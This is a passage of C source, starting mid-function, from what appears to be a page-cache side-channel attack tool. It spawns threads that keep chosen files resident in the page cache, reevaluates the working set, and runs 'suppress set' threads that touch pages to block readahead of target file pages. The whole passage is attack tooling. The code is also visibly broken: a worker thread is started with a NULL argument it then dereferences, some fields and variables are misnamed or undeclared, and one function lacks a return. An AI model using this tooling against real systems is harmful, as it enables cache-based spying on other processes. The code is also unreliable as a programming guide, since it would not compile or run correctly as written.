                {
#ifdef __linux
                    if (pread(current_cached_file->mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 ||
                        pread(current_cached_file->mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 )
                    {
                        // in case of error just print warnings and access whole ES
                        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at pread...\n", OSAL_EC));
                    }
#elif defined(_WIN32)
                    // TODO implement
#endif
                }
                else 
                {
                    tmp = *((uint8_t *) current_cached_file->mapping_.addr_ + p * PAGE_SIZE);
                } 
                accessed_pages++;  
            }         
        }
        accessed_files_count++;
        resident_files_node = resident_files_node->next_;
    }
    return accessed_pages * PAGE_SIZE;
}

void *wsManagerThread(void *arg)
{
    Attack *attack = arg;
    AttackWorkingSet *ws = &attack->working_set_;
    size_t runs_since_last_profile_update = 0;
    void *ret = NULL;

    // if access thread count is zero, stop operation as senseless
    if (ws->access_thread_count_ == 0)
    {
        return NULL;
    }

    //  reserve space for access thread data structures
    if (dynArrayResize(&ws->access_threads_, ws->access_thread_count_) == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL WS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayResize...\n", OSAL_EC));
        goto error;
    }
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        // initialise access thread data structures
        initPageAccessThreadWSData(dynArrayGet(&ws->access_threads_, t));
    }

    // spin up worker threads
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);

        DEBUG_PRINT((INFO WS_MGR_TAG "Thread %zu configured to access %zu files.\n", t, thread_data->resident_files_.count_));
        thread_data->ws_ = ws;
        thread_data->id_ = t;
        thread_data->running_ = 1;
        thread_data->sleep_time_ = ws->access_sleep_time_;
        if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadWS, NULL) != 0)
        {
            DEBUG_PRINT((FAIL WS_MGR_TAG "Error " OSAL_EC_FS " at creating WS access thread...\n", OSAL_EC));
            goto error;
        }
    }

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_MGR_TAG "WS manager thread running on core %d.\n", sched_getcpu()));

        // update ws profile
        if (runs_since_last_profile_update == ws->profile_update_all_x_evaluations_)
        {
            DEBUG_PRINT((DEBUG WS_MGR_TAG "Launching profile update - not implemented.\n"));
            // TODO
            // make new profile
            // split up into thread portions
            // spin up thread with new profile
            runs_since_last_profile_update = 0;
        }

        // reevaluate working set
        DEBUG_PRINT((DEBUG INFO WS_MGR_TAG "Reevaluating working set...\n"));
        // reevaluateWorkingSet fails if eviction was run during the reevaluation
        // in case of an error the original (current) lists are not changed
        if (ws->evaluation_ && reevaluateWorkingSet(attack) == 0)
        {
            // switch to newly profiled ws lists
            pthread_rwlock_wrlock(&ws->ws_lists_lock_);
            ws->up_to_date_list_set_ ^= 1;
            pthread_rwlock_unlock(&ws->ws_lists_lock_);
            DEBUG_PRINT((DEBUG INFO WS_MGR_TAG "Rescanned working set now consists of %zu files (%zu bytes mapped).\n", 
                ws->tmp_resident_files_[ws->up_to_date_list_set_].count_, 
                ws->tmp_mem_in_ws_[ws->up_to_date_list_set_]));
        }

        runs_since_last_profile_update++;
        nanosleep(&ws->evaluation_sleep_time_, NULL);
    }

    goto cleanup;

error:
    ret = (void *)-1;

cleanup:
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);

    return ret;
}

void *pageAccessThreadWS(void *arg)
{
    PageAccessThreadWSData *page_thread_data = arg; 
    AttackWorkingSet *ws = page_thread_data->ws_;
    size_t current_ws_list_set = 0;
    ListNode *resident_files_start = NULL;
    size_t resident_files_count = 0;
    size_t accessed_memory = 0;

    while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) started.\n", 
            (void *)page_thread_data->resident_files_.head_));
       
        // access current working set
        pthread_rwlock_rdlock(&ws->ws_lists_lock_);
        if(current_ws_list_set != ws->up_to_date_list_set_)
        {
            current_ws_list_set = ws->up_to_date_list_set_;
            resident_files_count = ws->resident_files_[current_ws_list_set].count_ / 
                ws->access_thread_count_;
            resident_files_start = listGetIndex(&ws->resident_files_[current_ws_list_set], 
                page_thread_data->id_ * resident_files_count); 
        }      
        accessed_memory = activateWS(resident_files_start, resident_files_count, 
            ws->access_use_file_api_);
        pthread_rwlock_unlock(&ws->ws_lists_lock_);

        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) accessed %zu kB memory.\n", 
            (void *) page_thread_data->resident_files_.head_, accessed_memory / 1024));

        // sleep for awhile
        nanosleep(&page_thread_data->sleep_time_, NULL);
    }

    return NULL;
}

int reevaluateWorkingSet(Attack *attack)
{
    AttackWorkingSet *ws = &attack->working_set_;
    // get current inactive list set 
    size_t inactive_list_set = ws->up_to_date_list_set_ ^ 1;
    // free inactive list
    listDestroy(&ws->resident_files_[inactive_list_set], closeCachedFileArrayFreeOnly);
    listDestroy(&ws->non_resident_files_[inactive_list_set], closeCachedFileArrayFreeOnly);
    ws->tmp_mem_in_ws_[inactive_list_set] = 0;

    // reevaluate resident files list
    // in case of an error the original lists are not changed
    if (reevaluateWorkingSetList(&ws->resident_files_[ws->up_to_date_list_set_], attack) < 0)
    {
        return -1;
    }
    // reevaluate non resident files list
    // in case of an error the original lists are not changed
    if (reevaluateWorkingSetList(&ws->non_resident_files_[ws->up_to_date_list_set_], attack) < 0)
    {
        return -1;
    }

    return 0;
}

int reevaluateWorkingSetList(List *cached_file_list, Attack *attack)
{
    AttackWorkingSet *ws = &attack->working_set_;
    // get current inactive list set 
    size_t inactive_list_set = ws->up_to_date_list_set_ ^ 1;
    ListNode *current_cached_file_node = NULL;
    ListNode *next_node = NULL;
    CachedFile current_cached_file = {0};
    TargetFile *target_file = NULL;

    // go cached files list
    current_cached_file_node = cached_file_list->head_;
    while (current_cached_file_node != NULL)
    {
        next_node = current_cached_file_node->next_;

        // copy current cached file and create a new dynarray
        // the copy ensures that the current state is not changed but kept
        current_cached_file = *((CachedFile *)current_cached_file_node->data_);
        if (!dynArrayInit(&current_cached_file.resident_page_sequences_, sizeof(PageSequence), ARRAY_INIT_CAP))
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayInit...\n", OSAL_EC));
            goto error;
        }

        // reevaluate file
        // get status of the file pages
        if (getCacheStatusFile(&current_cached_file.mapping_) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
            goto error;
        }
        // if file is a target file, zero pages inside the target pages readahead window
        if (current_cached_file.linked_target_file_ != NULL) 
        {
            if(current_cached_file.linked_target_file_->has_target_pages_)
            {
                targetPagesCacheStatusReadaheadTriggerPagesSet(&current_cached_file.linked_target_file->target_pages_, 
                    &current_cached_file.mapping_, attack->ra_window_size_pages_, 0);
                targetPagesCacheStatusSet(&current_cached_file.linked_target_file->target_pages_, 
                    &current_cached_file.mapping_, 0);
            }  
            else if(current_cached_file.linked_target_file_->has_target_sequence_)
            {
                targetSequenceCacheStatusReadaheadTriggerPagesSet(&current_cached_file.linked_target_file->target_sequence_, 
                    &current_cached_file.mapping_, attack->ra_window_size_pages_, 0);
                targetSequenceCacheStatusSet(&current_cached_file.linked_target_file->target_sequence_, 
                    &current_cached_file.mapping_, 0);
            }
        }
        // parse page sequences, skip in case of errors
        if (cachedFileProfileResidentPageSequences(&current_cached_file, ws->ps_add_threshold_) < 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at cachedFileProfileResidentPageSequences: %s...\n", OSAL_EC, file_path));
            goto error;
        }

        // eviction is running stop
        if (ws->eviction_ignore_evaluation_ && __atomic_load_n(&eviction_running, __ATOMIC_RELAXED) == 1)
        {
            DEBUG_PRINT((DEBUG WARNING "Eviction occured during reevaluation, ignoring result...\n"));
            goto error;
        }

        // move to file to tmp non resident file list
        if (current_cached_file.resident_memory_ == 0)
        {
            listAppendBack(&ws->non_resident_files_[inactive_list_set], &current_cached_file);
        }
        else
        {
            listAppendBack(&ws->resident_files_[inactive_list_set], &current_cached_file);
            ws->tmp_mem_in_ws_[inactive_list_set] += current_cached_file.resident_memory_;
        }

        current_cached_file_node = next_node;
    }

    return 0;

error:

    dynArrayDestroy(&current_cached_file.resident_page_sequences_, NULL);
    return -1;
}


/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK SUPPRESS SET
 */

// TODO use target files hash map to find pages and to add their readahead pages
// watch out to not add other target pages to the suppress set
int spawnSuppressThreads(Attack *attack)
{
    // prepare suppress set
    if(prepareSuppressSet(attack) != 0)
    {
        return -1;
    }

    // readahead surpressing threads for target
    for (size_t t = 0; t < attack->ss_thread_count_; t++)
    {
        pthread_t tid;

        if (pthread_create(&tid, NULL, suppressThread, (void *)&attack->suppress_set_) != 0)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
            return -1;
        }
        if (!dynArrayAppend(&attack->ss_threads_, &tid))
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            return -1;
        }
    }

    return 0;
}

int prepareSuppressSet(Attack *attack)
{
    // goes through target files and adds all pages which could trigger an readahead of the target
    // these are kept active in an attempt to avoid a readahead of the target
    if(hashMapForEach(&attack->targets_, targetsHmPrepareSuppressSet, attack) != HM_FE_OK)
    {
        return -1;
    }

}

int targetsHmPrepareSuppressSet(void *data, void *arg)
{
    Attack *attack = arg;
    TargetFile *target_file = data;
    TargetPage *target_pages = target_file->target_pages_.data_;
    // copy of target file
    TargetFile target_file_suppress = *target_file;

    // if whole file is target we can not suppress
    if(target_file_suppress.is_target_file_) 
    {
        return HM_FE_OK;
    }

    // init suppress page sequences array
    dynArrayInit(&target_file_suppress.suppress_sequences_, sizeof(PageSequence), 0);
    
    // allocate memory for cache status array, set pages which could trigger readeahead to 1
    if(target_file_suppress.mapping_.pages_cache_status_ == NULL)
    {
        target_file_suppress.mapping_.pages_cache_status_ = malloc(target_file_suppress.mapping_.size_pages_ * sizeof(unsigned char));
        if(target_file_suppress.mapping_.pages_cache_status_ == NULL)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at malloc...\n", OSAL_EC));
            goto error;
        }
    }
    // zero out
    memset(target_file_suppress.mapping_.pages_cache_status_ , 0, target_file_suppress.mapping_.size_pages_ * sizeof(unsigned char));
    
    // set pages which would trigger readahead to 1
    if(target_file_suppress.has_target_pages_)
    {
        targetPagesCacheStatusReadaheadTriggerPagesSet(&target_file_suppress.target_pages_, 
            &target_file_suppress.mapping_, attack->ra_window_size_pages_, 0);
        targetPagesCacheStatusSet(&target_file_suppress.target_pages_, 
            &target_file_suppress.mapping_, 0);
    }
    else if(target_file_suppress.has_target_sequence_)
    {
        targetSequenceCacheStatusReadaheadTriggerPagesSet(&target_file_suppress.target_sequence_, 
            &target_file_suppress.mapping_, attack->ra_window_size_pages_, 0);
        targetSequenceCacheStatusSet(&target_file_suppress.target_sequence_, 
            &target_file_suppress.mapping_, 0);
    }
    
    // add page sequences
    if(fileMappingProfileResidentPageSequences(target_file_suppress.mapping_, 1, &target_file_suppress.suppress_sequences_) == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at fileMappingProfileResidentPageSequences...\n", OSAL_EC));
        goto error;
    }

    if(dynArrayAppend(&attack->suppress_set_.suppress_set_, &target_file_suppress) == NULL) 
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
        goto error;
    }

    return HM_FE_OK;
error:
    closeTargetFileSuppressSetOnly(&target_file_suppress);
    return -1;
}

void activateSS(DynArray *suppress_set, int use_file_api)
{
    TargetFile *current_target_file = NULL;
    PageSequence *page_sequences = NULL;
    size_t page_sequences_length = 0;
    volatile uint8_t tmp;
    (void) tmp;
    
    for(size_t t = 0; t < suppress_set.size_; t++)
    {
        current_target_file = dynArrayGet(suppress_set, t);

        page_sequences = current_target_file->suppress_sequences_.data_;
        page_sequences_length = current_target_file->suppress_sequences_.size_;

        for (size_t s = 0; s < page_sequences_length; s++)
        {
            for (size_t p = page_sequences[s].offset_; p < page_sequences[s].offset_ +
                page_sequences[s].length_; p++)
            {
                //DEBUG_PRINT((DEBUG INFO "Accessing offset %zu, %zu length\n", resident_page_sequences[s].offset_, 
                //    resident_page_sequences[s].length_);
                // access page
                if(use_file_api) 
                {
#ifdef __linux
                    if (pread(current_target_file->mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 ||
                        pread(current_target_file->mapping_.internal_.fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1 )
                    {
                        // in case of error just print warnings and access whole ES
                        DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at pread...\n", OSAL_EC));
                    }
#elif defined(_WIN32)
                    // TODO implement
#endif
                }
                else 
                {
                    tmp = *((uint8_t *) current_target_file->mapping_.addr_ + p * PAGE_SIZE);
                } 
            }         
        }
    }
}

void *suppressThread(void *arg)
{
    AttackSuppressSet *ss = arg;
    volatile uint8_t tmp = 0;
    uint8_t **pages = ss->target_readahead_window_.data_;

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        activateSS(&ss->suppress_set_, ss->use_file_api_);
        nanosleep(&ss->access_sleep_time_, NULL);
    }

    return NULL;
}


/*-----------------------------------------------------------------------------
 * OTHER HELPER FUNCTIONS
 */
size_t getMappingCount(const unsigned char *status, size_t size_in_pages)
{
    size_t mapped = 0;

    for (size_t p = 0; p < size_in_pages; p++)
    {
        mapped += (status[p] & 1);
    }

    return mapped;
}